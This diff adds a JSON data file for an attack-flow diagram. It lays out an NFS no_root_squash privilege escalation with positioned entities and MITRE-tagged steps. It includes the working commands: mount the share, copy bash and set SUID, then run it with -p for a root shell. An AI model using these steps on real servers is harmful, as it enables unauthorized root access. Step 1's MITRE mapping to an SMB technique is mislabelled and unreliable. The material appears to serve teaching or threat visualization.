@@ -1,0 +1,219 @@
+{
+  "title": "NFS User ID Spoofing and Lateral SUID Planting",
+  "version": "3.0",
+  "tags": [
+    "NFS",
+    "RPC",
+    "no_root_squash",
+    "SUID",
+    "Lateral_Movement",
+    "Privilege_Escalation"
+  ],
+  "entities": [
+    {
+      "id": "attacker_infrastructure",
+      "label": "Attacker Infrastructure",
+      "icon": "IconKali",
+      "type": "container",
+      "members": [
+        "kali_root_user"
+      ],
+      "position": {
+        "x": 150.14999999999998,
+        "y": 74.65
+      }
+    },
+    {
+      "id": "kali_root_user",
+      "label": "Remote Root User",
+      "icon": "IconHacker",
+      "type": "node",
+      "position": {
+        "x": 150.14999999999998,
+        "y": 74.65
+      }
+    },
+    {
+      "id": "target_network",
+      "label": "Target Network",
+      "icon": "IconNetwork",
+      "type": "container",
+      "members": [
+        "nfs_file_server"
+      ],
+      "position": {
+        "x": 378,
+        "y": 361.3
+      }
+    },
+    {
+      "id": "nfs_file_server",
+      "label": "NFS Server",
+      "icon": "IconServer",
+      "type": "container",
+      "members": [
+        "nfs_export",
+        "suid_payload",
+        "low_priv_ssh",
+        "target_root_shell"
+      ],
+      "position": {
+        "x": 378,
+        "y": 361.3
+      }
+    },
+    {
+      "id": "nfs_export",
+      "label": "Shared Directory",
+      "icon": "IconDatabase",
+      "type": "node",
+      "position": {
+        "x": 605.85,
+        "y": 297.25
+      }
+    },
+    {
+      "id": "suid_payload",
+      "label": "SUID Bash (/shared/shell)",
+      "icon": "IconInfectedCode",
+      "type": "node",
+      "position": {
+        "x": 414.75,
+        "y": 409.6
+      }
+    },
+    {
+      "id": "low_priv_ssh",
+      "label": "Low Privilege SSH",
+      "icon": "IconTerminal",
+      "type": "node",
+      "position": {
+        "x": 150.14999999999998,
+        "y": 425.35
+      }
+    },
+    {
+      "id": "target_root_shell",
+      "label": "Root Shell",
+      "icon": "IconInfectedTerminal",
+      "type": "node",
+      "position": {
+        "x": 605.85,
+        "y": 425.35
+      }
+    }
+  ],
+  "visibility": {
+    "attacker_infrastructure": {
+      "start": 0,
+      "end": 100
+    },
+    "kali_root_user": {
+      "start": 0,
+      "end": 100
+    },
+    "target_network": {
+      "start": 0,
+      "end": 100
+    },
+    "nfs_file_server": {
+      "start": 0,
+      "end": 100
+    },
+    "nfs_export": {
+      "start": 0,
+      "end": 100
+    },
+    "low_priv_ssh": {
+      "start": 0,
+      "end": 100
+    },
+    "suid_payload": {
+      "start": 2,
+      "end": 100
+    },
+    "target_root_shell": {
+      "start": 5,
+      "end": 100
+    }
+  },
+  "steps": [
+    {
+      "id": 1,
+      "name": "Network Mount",
+      "mitre": {
+        "id": "T1021.002",
+        "tactic": "Lateral Movement",
+        "technique": "Remote Services: SMB/Windows Admin Shares"
+      },
+      "type": "edge",
+      "from": "kali_root_user",
+      "to": "nfs_export",
+      "description": "Attacker mounts the target share over RPC to their local machine",
+      "cli": "mount -t nfs 10.10.10.10:/shared /tmp/pe"
+    },
+    {
+      "id": 2,
+      "name": "File Creation (Spoofed UID)",
+      "mitre": {
+        "id": "T1068",
+        "tactic": "Privilege Escalation",
+        "technique": "Exploitation for Privilege Escalation"
+      },
+      "type": "edge",
+      "from": "kali_root_user",
+      "to": "suid_payload",
+      "description": "Attacker copies bash and runs chmod +s locally",
+      "cli": "cp /bin/bash /tmp/pe/shell && chmod +s /tmp/pe/shell"
+    },
+    {
+      "id": 3,
+      "name": "Network Transfer",
+      "mitre": {
+        "id": "T1068",
+        "tactic": "Privilege Escalation",
+        "technique": "Exploitation for Privilege Escalation"
+      },
+      "type": "edge",
+      "from": "suid_payload",
+      "to": "nfs_export",
+      "description": "NFS propagates this as UID 0 due to no_root_squash, saving it to disk with root ownership intact"
+    },
+    {
+      "id": 4,
+      "name": "Trigger Execution",
+      "mitre": {
+        "id": "T1059.004",
+        "tactic": "Execution",
+        "technique": "Command and Scripting Interpreter: Unix Shell"
+      },
+      "type": "edge",
+      "from": "low_priv_ssh",
+      "to": "suid_payload",
+      "description": "The low privilege user runs ./shell -p from the local share path",
+      "cli": "/shared/shell -p"
+    },
+    {
+      "id": 5,
+      "name": "EUID Transition",
+      "mitre": {
+        "id": "T1548.001",
+        "tactic": "Privilege Escalation",
+        "technique": "Abuse Elevation Control Mechanism: Setuid and Setgid"
+      },
+      "type": "edge",
+      "from": "suid_payload",
+      "to": "target_root_shell",
+      "description": "The kernel honors the SUID bit owned by root, transitioning the process to an interactive root shell"
+    }
+  ],
+  "viewport": {
+    "zoom": 0.49999999999999845,
+    "pan": {
+      "x": 673.4623107910156,
+      "y": 291.023946126302
+    }
+  },
+  "attackMatrixOpen": false,
+  "sizeControlsOpen": false
+}
